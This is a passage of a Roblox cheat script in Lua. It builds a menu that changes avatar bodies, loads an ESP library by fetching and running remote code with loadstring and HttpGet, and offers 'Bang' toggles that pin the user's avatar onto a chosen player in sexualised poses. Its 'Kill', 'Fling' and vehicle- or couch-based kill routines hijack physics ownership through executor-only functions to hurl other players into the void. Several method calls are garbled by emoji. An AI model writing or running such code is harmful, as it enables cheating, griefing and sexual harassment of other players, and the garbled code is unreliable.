        [1] = 17754346388,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "🔥Boy Body 🔥",
  Callback = function()
local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 1,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Boy Body Copy",
  Callback = function()
local args = {
    [1] = {
        [1] = 86499666,
        [2] = 27112039,
        [3] = 27112052,
        [4] = 27112068,
        [5] = 27112056,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Boy Body Roll",
  Callback = function()
local args = {
    [1] = {
        [1] = 27112025,
        [2] = 27112039,
        [3] = 27112052,
        [4] = 3230472745,
        [5] = 3230470862,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Lighter",
  Callback = function()
local args = {
    [1] = {
        [1] = 18178775358,
        [2] = 18178775182,
        [3] = 18178775725,
        [4] = 18178777453,
        [5] = 18178775695,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
end})
AddButton(Main, {
  Name = " Dwarf Body ",
  Callback = function()
local args = {
    [1] = {
        [1] = 14579958702,
        [2] = 14579959062,
        [3] = 14579959191,
        [4] = 14579959249,
        [5] = 14579963667,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Dwarf Body2",
  Callback = function()
local args = {
    [1] = {
        [1] = 77813057823038,
        [2] = 135110043370135,
        [3] = 116607813654019,
        [4] = 138966229804486,
        [5] = 128961183894053,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "3Dwarf Body",
  Callback = function()
local args = {
    [1] = {
        [1] = 120973199097564,
        [2] = 118345433416023,
        [3] = 112849465115864,
        [4] = 78321005147549,
        [5] = 106586789635639,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = " Dwarf Body",
  Callback = function()
local args = {
    [1] = {
        [1] = 126267841602936,
        [2] = 77530451194918,
        [3] = 123471958406889,
        [4] = 117042768644173,
        [5] = 131948590344338,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Hamster",
  Callback = function()
  local args = {
    [1] = {
        [1] = 14898536974,
        [2] = 14898536957,
        [3] = 14898537277,
        [4] = 14898537300,
        [5] = 14898537292,
        [6] = 14898536975
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
local Main = MakeTab({Name = "Detection|ESP"})
local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()
ESP:Toggle(true)
ESP.Players = false
ESP.Names = false
local Toggle = AddToggle(Main, {
  Name = "Enable",
  Default = false,
  Callback = function(Value)
    ESP.Players = Value
  end
})
local Toggle = AddToggle(Main, {
  Name = "Player Names",
  Default = false,
  Callback = function(Value)
    ESP.Names = Value
  end
})
AddColorPicker(Main, {
  Name = "ESP Color ",
  Default = Color3.fromRGB(255, 255, 0),
  Callback = function(Value)
    ESP.Color = Value
  end
})
local Main = MakeTab({Name = "Mercy and Destruction☠️👽"})
  local Paragraph = AddParagraph(Main, {"There are some types of killing and pulling 🕺🏻", "good morning my brothers"})
 
  local Players = game:GetService("Players")
  local RunService = game:GetService("RunService")
 
  local function fetchPlayerNames()
  local namesList = {}
  for _, plr in ipairs(Players:GetPlayers()) do
  if plr ~= Players.LocalPlayer then
  table.insert(namesList, plr.Name)
  end
  end
  return namesList
  end
 
  local dropdown = AddDropdown(Main, {
  Name = "Select a player",
  Default = "...",
  Options = fetchPlayerNames(),
  Callback = function(Value)
  if Value ~= "" then
  getgenv().selectedPlayer = Value
  end
  end
  })
 
  local function createBangToggle(name, yOffset, faceBang)
  local bangActive = false
  local connection
  local togglePosition = false
 
  AddToggle(Main, {
  Name = name,
  Default = false,
  Callback = function(Value)
  bangActive = Value
 
  local player = Players.LocalPlayer
  local char = player.Character
  if not char then return end
 
  local humanoid = char:FindFirstChildOfClass("Humanoid")
  if not humanoid then return end
 
  if Value then
  humanoid.PlatformStand = true
 
  if connection then connection😀isconnect() end
 
  connection = RunService.Heartbeat:Connect(function()
  if bangActive and getgenv().selectedPlayer then
  local targetPlayer = Players:FindFirstChild(getgenv().selectedPlayer)
  if targetPlayer and targetPlayer.Character and targetPlayer.Character.PrimaryPart then
  local targetHead = targetPlayer.Character:FindFirstChild("Head")
  if targetHead and char.PrimaryPart then
  local offset = togglePosition and 1 or 4
  if faceBang then
  char:SetPrimaryPartCFrame(targetHead.CFrame * CFrame.new(0, 1, -offset) * CFrame.Angles(0, math.rad(180), 0))
  else
  char:SetPrimaryPartCFrame(targetHead.CFrame * CFrame.new(0, yOffset, offset) * CFrame.Angles(0, 0, 0))
  end
  togglePosition = not togglePosition
  wait(1)
  end
  end
  end
  end)
  else
  humanoid.PlatformStand = false
  if connection then
  connection😀isconnect()
  connection = nil
  end
  end
  end
  })
  end
 
  createBangToggle("Bang", -1, false)
  createBangToggle("Bang 2", -1.5, false)
  createBangToggle("Face Bang", 1, true)
  createBangToggle("Face Bang 2", 1, true)
 
  AddSection(Main, {"Advanced Killing"})
 
  local Players = game:GetService("Players")
  local Workspace = game:GetService("Workspace")
  local RunService = game:GetService("RunService")
  local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
  local selectedPlayerName = nil
  local destination = Vector3.new(265.46, -450.83, -59.93)
  local originalPosition = nil
 
  local playerNames = {}
  for _, player in pairs(Players:GetPlayers()) do
      table.insert(playerNames, player.Name)
  end
 
  local selectedPlayerName = nil
 
  local Dropdown = AddDropdown(Main, {
  Name = "Choose Player",
   Options = playerNames,
      Callback = function(selected)
          selectedPlayerName = selected
      end
  })
 
  AddButton(Main, {
  Name = "Kill Player with Bus",
  Callback = function()
          if not selectedPlayerName then
              print("No player selected!")
              return
          end
 
          local player = Players.LocalPlayer
          local character = player.Character or player.CharacterAdded:Wait()
          local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 
          -- Store the player's initial position before fling
          originalPosition = humanoidRootPart.CFrame
 
          -- Function to get the bus
          local function GetBus()
              local vehicles = Workspace:FindFirstChild("Vehicles")
              if vehicles then
                  return vehicles:FindFirstChild(player.Name.."Car")
              end
              return nil
          end
 
          local bus = GetBus()
 
          -- If the bus doesn't exist, try to spawn one
          if not bus then
              humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
              task.wait(0.5)
              local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
              if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
                  remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
              end
              task.wait(1)
              bus = GetBus()
          end
 
          -- If spawned successfully, try to sit in the driver's seat
          if bus then
              local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
              if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then
                  repeat
                      humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
                      task.wait()
                  until character.Humanoid.Sit or not bus.Parent
              end
          end
 
          -- System to follow the player and detect when they sit
          local function TrackPlayer()
              while true do
                  if selectedPlayerName then
                      local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                      if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                          local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                          if targetHumanoid and targetHumanoid.Sit then
                              -- When the player sits, execute the jump immediately
                              if character.Humanoid then
                                  -- Take the bus to the "void" coordinate
                                  bus:SetPrimaryPartCFrame(CFrame.new(destination)) -- Moving to void
                                  print("Player sat, taking bus to coordinate!")
 
                                  -- Wait 0.2 seconds after taking the bus to void before jumping
                                  task.wait(0.2)
 
                                  -- Simulate click on Roblox jump button
                                  local function simulateJump()
                                      local humanoid = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
                                      if humanoid then
                                          humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                      end
                                  end
 
                                  -- Simulating jump
                                  simulateJump()
 
                                  print("Simulating jump button click!")
 
                                  -- After jump, teleport player to initial position
                                  task.wait(0.5)
                                  humanoidRootPart.CFrame = originalPosition
                                  print("Player teleported to initial position!")
                              end
 
                              break
                          else
                              -- Follow the player, moving the bus fast
                              local targetRoot = targetPlayer.Character.HumanoidRootPart
                              local offset = math.sin(tick() * 32) * 8
                              bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(0, 0, -2) * CFrame.new(offset, 0, -2))
                          end
                      end
                  end
                  RunService.RenderStepped:Wait()
              end
          end
 
          -- Start tracking
          spawn(TrackPlayer)
      end
  })
 
  local Players = game:GetService("Players")
  local Workspace = game:GetService("Workspace")
  local RunService = game:GetService("RunService")
 
  local playerNames = {}
  for _, player in pairs(Players:GetPlayers()) do
      table.insert(playerNames, player.Name)
  end
 
  local selectedPlayerName = nil
 
  local Dropdown = AddDropdown(Main, {
  Name = "Choose Player",
  Options = playerNames,
  Callback = function(selected)
          selectedPlayerName = selected
      end
  })
 
  local function executeScript()
      local UserInputService = game:GetService("UserInputService")
      local Mouse = game.Players.LocalPlayer:GetMouse()
      local Folder = Instance.new("Folder", Workspace)
      local Part = Instance.new("Part", Folder)
      local Attachment1 = Instance.new("Attachment", Part)
      Part.Anchored = true
      Part.CanCollide = false
      Part.Transparency = 1
 
      local NetworkAccess = coroutine.create(function()
          settings().Physics.AllowSleep = false
          while RunService.RenderStepped:Wait() do
              for _, player in next, Players:GetPlayers() do
                  if player ~= Players.LocalPlayer then
                      player.MaximumSimulationRadius = 0
                      sethiddenproperty(player, "SimulationRadius", 0)
                  end
              end
              Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
              setsimulationradius(math.huge)
          end
      end)
      coroutine.resume(NetworkAccess)
 
      local function ForceVehicle(v)
          if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
              Mouse.TargetFilter = v
              for _, x in next, v:GetDescendants() do
                  if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                      x😀estroy()
                  end
              end
              if v:FindFirstChild("Attachment") then
                  v:FindFirstChild("Attachment")😀estroy()
              end
              if v:FindFirstChild("AlignPosition") then
                  v:FindFirstChild("AlignPosition")😀estroy()
              end
              if v:FindFirstChild("Torque") then
                  v:FindFirstChild("Torque")😀estroy()
              end
              for _, part in next, v:GetDescendants() do
                  if part:IsA("BasePart") then
                      part.CanCollide = false
                      local Torque = Instance.new("Torque", part)
                      Torque.Torque = Vector3.new(100000 * 12, 100000 * 12, 100000 * 12)
                      local AlignPosition = Instance.new("AlignPosition", part)
                      local Attachment2 = Instance.new("Attachment", part)
                      Torque.Attachment0 = Attachment2
                      AlignPosition.MaxForce = 999999
                      AlignPosition.MaxVelocity = math.huge
                      AlignPosition.Responsiveness = 200
                      AlignPosition.Attachment0 = Attachment2
                      AlignPosition.Attachment1 = Attachment1
                  end
              end
          end
      end
 
      for _, v in next, Workspace:GetDescendants() do
          ForceVehicle(v)
      end
 
      Workspace.DescendantAdded:Connect(function(v)
          ForceVehicle(v)
      end)
 
      spawn(function()
          while true do
              local voidPosition = Vector3.new(101, -446, -180)
              Attachment1.WorldCFrame = CFrame.new(voidPosition)
              RunService.RenderStepped:Wait()
          end
      end)
  end
 
  local function monitorSeats()
      for _, seat in pairs(Workspace:GetDescendants()) do
          if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
              seat:GetPropertyChangedSignal("Occupant"):Connect(function()
                  if seat.Occupant then
                      local occupantPlayer = Players:GetPlayerFromCharacter(seat.Occupant.Parent)
                      if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                          executeScript()
                      end
                  end
              end)
          end
      end
 
      Workspace.DescendantAdded:Connect(function(descendant)
          if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then
              descendant:GetPropertyChangedSignal("Occupant"):Connect(function()
                  if descendant.Occupant then
                      local occupantPlayer = Players:GetPlayerFromCharacter(descendant.Occupant.Parent)
                      if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                          executeScript()
                      end
                  end
              end)
          end
      end)
  end
 
  monitorSeats()
  AddButton(Main, {
  Name = "Kill Player Ship",
  Callback = function()
  local Player = game.Players.LocalPlayer
  local Character = Player.Character or Player.CharacterAdded:Wait()
  local Humanoid = Character:FindFirstChildOfClass("Humanoid")
  local RootPart = Character:WaitForChild("HumanoidRootPart")
  local Vehicles = game.Workspace:FindFirstChild("Vehicles")
  local OldPos = RootPart.CFrame
 
  if not Humanoid or not Vehicles then return end
 
  local function GetCar()
      return Vehicles:FindFirstChild(Player.Name.."Car")
  end
 
  local PCar = GetCar()
 
  if not PCar then
      RootPart.CFrame = CFrame.new(25.9511604, 4.09631968, 1581.40173, 0.0186735559, -3.64394381e-08, 0.999825656, -8.91815333e-09, 1, 3.66123558e-08, -0.999825656, -9.60028146e-09, 0.0186735559)
      task.wait(0.5)
      local RemoteEvent = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
      if RemoteEvent and RemoteEvent:FindFirstChild("1Ca1r") then
          RemoteEvent["1Ca1r"]:FireServer("PickingBoat", "PirateFree")
      end
      task.wait(1)
      PCar = GetCar()
  end
 
  if PCar then
      local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
      if Seat and not Humanoid.Sit then
          repeat
              RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
              task.wait()
          until Humanoid.Sit or not PCar.Parent
      end
  end
          wait(0.2)
 
          local UserInputService = game:GetService("UserInputService")
          local RunService = game:GetService("RunService")
          local Mouse = Players.LocalPlayer:GetMouse()
          local Folder = Instance.new("Folder", game:GetService("Workspace"))
          local Part = Instance.new("Part", Folder)
          local Attachment1 = Instance.new("Attachment", Part)
          Part.Anchored = true
          Part.CanCollide = false
          Part.Transparency = 1
 
          local NetworkAccess = coroutine.create(function()
              settings().Physics.AllowSleep = false
              while RunService.RenderStepped:Wait() do
                  for _, player in next, Players:GetPlayers() do
                      if player ~= Players.LocalPlayer then
                          player.MaximumSimulationRadius = 0
                          sethiddenproperty(player, "SimulationRadius", 2)
                      end
                  end
                  Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
                  setsimulationradius(math.huge)
              end
          end)
          coroutine.resume(NetworkAccess)
 
          local function ForceVehicle(v)
              if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
                  Mouse.TargetFilter = v
                  for _, x in next, v:GetDescendants() do
                      if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                          x😀estroy()
                      end
                  end
                  if v:FindFirstChild("Attachment") then
                      v:FindFirstChild("Attachment")😀estroy()
                  end
                  if v:FindFirstChild("AlignPosition") then
                      v:FindFirstChild("AlignPosition")😀estroy()
                  end
                  if v:FindFirstChild("Torque") then
                      v:FindFirstChild("Torque")😀estroy()
                  end
                  for _, part in next, v:GetDescendants() do
                      if part:IsA("BasePart") then
                          part.CanCollide = false
                          local Torque = Instance.new("Torque", part)
                          Torque.Torque = Vector3.new(1000 * 102, 100000 * 102, 10000 * 12)
                          local AlignPosition = Instance.new("AlignPosition", part)
                          local Attachment2 = Instance.new("Attachment", part)
                          Torque.Attachment0 = Attachment2
                          AlignPosition.MaxForce = 99999
                          AlignPosition.MaxVelocity = math.huge
                          AlignPosition.Responsiveness = 200
                          AlignPosition.Attachment0 = Attachment2
                          AlignPosition.Attachment1 = Attachment1
                      end
                  end
              end
          end
 
          for _, v in next, game:GetService("Workspace"):GetDescendants() do
              ForceVehicle(v)
          end
 
          game:GetService("Workspace").DescendantAdded:Connect(function(v)
              ForceVehicle(v)
          end)
 
          spawn(function()
              while true do
                  if selectedPlayerName then
                      local player = Players:FindFirstChild(selectedPlayerName)
                      if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                          local rootPart = player.Character.HumanoidRootPart
                          Attachment1.WorldCFrame = rootPart.CFrame
                      end
                  end
                  RunService.RenderStepped:Wait()
              end
          end)
 
          wait(4)
 
          local targetPosition = Vector3.new(101, -446, -180)
          player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
 
          local function onPlayerSeated(player)
              if player and player.Character then
                  local humanoid = player.Character:FindFirstChild("Humanoid")
                  if humanoid and humanoid.SeatPart then
                      if humanoid.SeatPart.Parent:IsA("VehicleSeat") then
                          player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                      end
                  end
              end
          end
 
          game:GetService("Players").PlayerAdded:Connect(function(player)
              if player.Name == selectedPlayerName then
                  player.CharacterAdded:Connect(function(character)
                      local humanoid = character:WaitForChild("Humanoid")
                      humanoid.Seated:Connect(function(_, seat)
                          if seat then
                              onPlayerSeated(player)
                          end
                      end)
                  end)
              end
          end)
      end
  })
 
  AddButton(Main, {
  Name = "Update Player Names",
  Callback = function()
      Tab:UpdateDropdown("Select Player", GetPlayerList(), "")
  end
})
  AddSection(Main, {"Normal Type Killing"})
 
  AddTextBox(Main, {
  Name = "Player Name",
  Default = "",
  PlaceholderText = "Put full name",
  ClearText = true,
  Callback = function(value)
  playerTextbox = value
  end
  })
  AddButton(Main, {
  Name = "Pull",
  Callback = function()
  local targetPlayer = findPlayerByName(playerTextbox)
  if targetPlayer then
  teleportToPlayer(targetPlayer, "bring")
  else
  MakeNotifi({
  Title = "Sorry!" ,
  Text = "Please enter the full player name⛔️" ,
  Time = 5
  })
  end
  end
  })
  AddButton(Main, {
  Name = "Fling",
  Callback = function()
  local targetPlayer = findPlayerByName(playerTextbox)
  if targetPlayer then
  teleportToPlayer(targetPlayer, "fling")
  else
  MakeNotifi({
  Title = "Sorry!" ,
  Text = "Please enter the full player name⛔️" ,
  Time = 5
  })
  end
  end
  })
  AddButton(Main, {
  Name = "Kill",
  Callback = function()
  local targetPlayer = findPlayerByName(playerTextbox)
  if targetPlayer then
  teleportToPlayer(targetPlayer, "kill")
  else
  MakeNotifi({
  Title = "Sorry!" ,
  Text = "Please enter the full player name⛔️" ,
  Time = 5
  })
  end
  end
  })
  AddSection(Main, {"Get the Couch Before You Do"})
  AddButton(Main, {
  Name = "Click to Get the Couch",
  Callback = function()
  local args={[1]="PickingTools",[2]="Couch"};game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  end
  })
 
  -- Required services
  local playerService = game:GetService('Players')
  local runService = game:GetService('RunService')
  local player = playerService.LocalPlayer
 
  -- Global variables
  local selectedPlayer = nil
  local selectedKillAdvancedPlayer = nil
  local couchEquipped = false
  local playerDropdownV13
 
  -- Function to get player list
  local function getPlayerList()
  local playerList = {}
  for _, player in ipairs(playerService:GetPlayers()) do
  if player ~= playerService.LocalPlayer then
  table.insert(playerList, player.Name)
  end
  end
  return playerList
  end
 
  -- Function to update dropdown
  local function updateDropdown(dropdown)
  UpdateDropdown(dropdown, getPlayerList())
  end
 
  -- Function to find player by name
  local function gplr(String)
  local strl = String:lower()
  local Found = {}
  for _, v in pairs(playerService:GetPlayers()) do
  if v.Name:lower():sub(1, #strl) == strl then
  table.insert(Found, v)
  end
  end
  return Found
  end
 
  -- Function to fling player (V13)
  local function flingPlayer(targetName)
  local Target = gplr(targetName)
  if Target[1] then
  Target = Target[1]
 
  local Thrust = Instance.new('BodyThrust', player.Character.HumanoidRootPart)
  Thrust.Force = Vector3.new(999, 999, 999)
  Thrust.Name = "FlingForce"
  repeat
  player.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
  Thrust.Location = Target.Character.HumanoidRootPart.Position
  runService.Heartbeat:Wait()
  until not Target.Character:FindFirstChild("Head")
  end
  end
 
  -- Interface for Fling V13
  playerDropdownV13 = AddDropdown(Main, {
  Name = "Please choose the victim",
  Default = "",
  Options = getPlayerList(),
  Callback = function(value)
  selectedPlayer = value
  end
  })
 
  AddButton(Main, {
  Name = "Kill the Victim",
  Callback = function()
  if selectedPlayer then
  flingPlayer(selectedPlayer)
  end
  end
  })
 
  -- Update player list when players join or leave the game
  playerService.PlayerAdded:Connect(function()
  updateDropdown(playerDropdownV13)
  end)
 
  playerService.PlayerRemoving:Connect(function()
  updateDropdown(playerDropdownV13)
  end)
 
  -- Update player list at script start
  updateDropdown(playerDropdownV13)
 
  -- Required services
  local playerService = game:GetService('Players')
  local runService = game:GetService('RunService')
  local localPlayer = playerService.LocalPlayer
 
  -- Global variables
  local flingV14Toggle = false
  local currentPlayerIndex = 1
  local flingV14Connection
  local players
 
  -- Function to teleport to specific coordinate
  local function teleportToCoordinate()
  local teleportPosition = Vector3.new(-58, 54, -183) -- Coordinate where you want to teleport
  if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
  localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
  end
  end
 
  -- Function to fling players in sequence
  local function flingPlayersInSequence()
  if flingV14Toggle then
  -- Get player list once
  players = playerService:GetPlayers()
 
  -- Reset current player index
  currentPlayerIndex = 1
 
  -- Looping teleports to each player
  flingV14Connection = runService.Heartbeat:Connect(function()
  -- Skip local player
  while players[currentPlayerIndex] == localPlayer do
  currentPlayerIndex = currentPlayerIndex + 1
  if currentPlayerIndex > #players then
  currentPlayerIndex = 1
  end
  end
 
  local targetPlayer = players[currentPlayerIndex]
  if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
  if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
  localPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
 
  -- Check if target player is sitting
  if targetPlayer.Character:FindFirstChild("Humanoid") and targetPlayer.Character.Humanoid.SeatPart then
  teleportToCoordinate()
 
  -- Wait 3 seconds before going to next player
  wait(5)
  currentPlayerIndex = currentPlayerIndex + 1
 
  if currentPlayerIndex > #players then
  currentPlayerIndex = 1
  end
  end
  end
  end
  end)
  end
  end
 
  -- Callback function for toggle
  local function onFlingV14Toggle(value)
  flingV14Toggle = value
  if flingV14Toggle then
  flingPlayersInSequence()
  else
  -- Disconnect connections when toggle is disabled
  if flingV14Connection then
  flingV14Connection😀isconnect()
  flingV14Connection = nil
  end
  end
  end
 
  local function killAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(649.78, -439.87, 126.35) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
 
  local function WatherAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  -- Equip 'Couch' item in inventory if not equipped yet
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-72.37123107910156, -10.816083908081055, 112.93341827392578) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  -- Player list for Advanced Bring
  local killAdvancedPlayerList = {}
  for _, player in ipairs(game.Players:GetPlayers()) do
  table.insert(killAdvancedPlayerList, player.Name)
  end
 
  local function updatePlayerList()
  local players = game.Players:GetPlayers()
  local playerNames = {}
  for _, player in ipairs(players) do
  table.insert(playerNames, player.Name)
  end
  return playerNames
  end
 
 
  local selectedKillAdvancedPlayer = nil
  local couchEquipped = false
 
  local function killAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  -- Equip 'Couch' item in inventory if not equipped yet
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8.657157897949219, -222.3133087158203, -23.58349609375) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function FlyAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
